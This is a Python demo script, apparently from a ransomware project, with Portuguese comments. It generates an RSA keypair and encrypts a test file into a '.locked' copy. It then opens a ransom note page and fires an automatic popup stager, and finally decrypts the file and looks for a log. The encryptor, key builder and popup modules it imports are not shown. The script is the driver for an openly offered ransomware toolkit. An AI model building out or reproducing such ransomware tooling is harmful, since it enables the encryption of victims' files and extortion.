# run_demo.py

import os
import time
import webbrowser
import subprocess
from infrastructure import encryptor, decryptor
from builder import keygen
from ransom import ransom_note_generator, auto_popup_stager

TEST_FILE = "demo_arquivo.txt"
PUBLIC_KEY = "public.pem"
PRIVATE_KEY = "private.pem"
UID = "UID_DEMO_RUN"

def step(msg):
    print(f"\n🔧 {msg}")

def run_demo():
    # 1. Gera arquivo de teste
    step("Gerando arquivo de teste")
    with open(TEST_FILE, 'w', encoding="utf-8") as f:
        f.write("Conteúdo do arquivo de demonstração brutal.")

    # 2. Gera chave RSA (se não existir)
    if not os.path.exists(PUBLIC_KEY) or not os.path.exists(PRIVATE_KEY):
        step("Gerando par de chaves RSA")
        keygen.generate_keypair(PUBLIC_KEY, PRIVATE_KEY)

    # 3. Executa criptografia
    step("Criptografando com HUD + ransom note")
    encryptor.encrypt_file(TEST_FILE, PUBLIC_KEY, UID)

    # 4. Abre HTML e popup
    step("Abrindo ransom.html e simulando popup")
    ransom_note_path = os.path.abspath("ransom/ransom.html")
    webbrowser.open(ransom_note_path)
    auto_popup_stager.auto_invoke_popup(ransom_note_path)

    # Aguarda uns segundos para visualização
    time.sleep(5)

    # 5. Descriptografa
    locked_file = TEST_FILE + ".locked"
    if os.path.exists(locked_file):
        step("Descriptografando para restaurar o arquivo")
        decryptor.decrypt_file(locked_file, PRIVATE_KEY, UID)

    # 6. Mostra log
    log_path = os.path.join("output", f"log_{UID}.json")
    if os.path.exists(log_path):
        step(f"Log salvo em: {log_path}")
    else:
        print("❌ Log não encontrado.")

    print("\n✅ DEMO COMPLETA EXECUTADA")

if __name__ == "__main__":
    run_demo()
